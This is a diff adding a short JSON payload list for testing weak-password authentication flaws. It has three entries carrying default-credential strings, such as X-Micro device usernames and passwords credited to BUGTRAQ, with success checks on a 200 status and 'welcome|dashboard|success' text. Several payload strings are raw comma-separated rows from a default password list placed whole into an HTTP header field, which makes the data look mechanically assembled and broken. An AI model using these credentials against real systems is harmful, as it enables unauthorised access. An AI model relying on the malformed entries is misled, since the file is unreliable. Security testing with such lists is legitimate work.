@@ -1,0 +1,35 @@
+[
+  {
+    "payload_id": "OWP-387696",
+    "vulnerability_category": "Identification & Authentication Failures (Weak Passwords)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "x-admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|success"
+    }
+  },
+  {
+    "payload_id": "OWP-390436",
+    "vulnerability_category": "Identification & Authentication Failures (Weak Passwords)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Micro,1502,1502,From BUGTRAQ",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|success"
+    }
+  },
+  {
+    "payload_id": "OWP-390437",
+    "vulnerability_category": "Identification & Authentication Failures (Weak Passwords)",
+    "target_technology": "Generic",
+    "injection_point": "header",
+    "payload_string": "X-Micro,super,super,From BUGTRAQ",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "welcome|dashboard|success"
+    }
+  }
+]
